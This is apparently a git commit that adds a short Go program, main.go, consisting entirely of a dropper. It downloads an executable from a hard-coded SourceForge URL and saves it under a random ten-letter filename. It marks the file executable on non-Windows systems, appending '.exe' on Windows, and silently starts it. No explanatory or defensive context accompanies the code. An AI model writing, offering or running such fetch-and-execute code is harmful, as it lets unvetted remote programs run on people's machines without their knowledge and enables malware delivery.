f0d6fe3d371bc95bef4e3d5fee1d11a7d96d0a3c
Anton Petrov <antonio24m@gmail.com>
2018-08-05 20:31:20 +0300

    Add files via upload

---
+++ main.go
@@ -0,0 +1,46 @@
+package main
+import ("os";"os/exec";"net/http";"io";"runtime";"time";"math/rand")
+func downloadFile(filepath string, url string) (err error) {
+  // Create the file
+  out, err := os.Create(filepath)
+  if err != nil  {
+    return err
+  }
+  defer out.Close()
+
+  resp, err := http.Get(url)
+  if err != nil {
+    return err
+  }
+  defer resp.Body.Close()
+
+  _, err = io.Copy(out, resp.Body)
+  if err != nil  {
+    return err
+  }
+
+  return nil
+}
+var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+func randSeq(n int) string {
+  rand.Seed(time.Now().UTC().UnixNano())
+  b := make([]rune, n)
+  for i := range b {
+      b[i] = letters[rand.Intn(len(letters))]
+  }
+  return string(b)
+}
+func main() {
+  var url string = "http://case-sw.sourceforge.net/sample.exe"
+  var length int = 10
+  var name string = randSeq(length)
+    
+  if runtime.GOOS != "windows" {
+    downloadFile(name, url)
+    exec.Command("chmod", "+x", name).Run()
+  } else {
+    name += ".exe"
+    downloadFile(name, url)
+  }
+  exec.Command("./" + name).Start()
+}
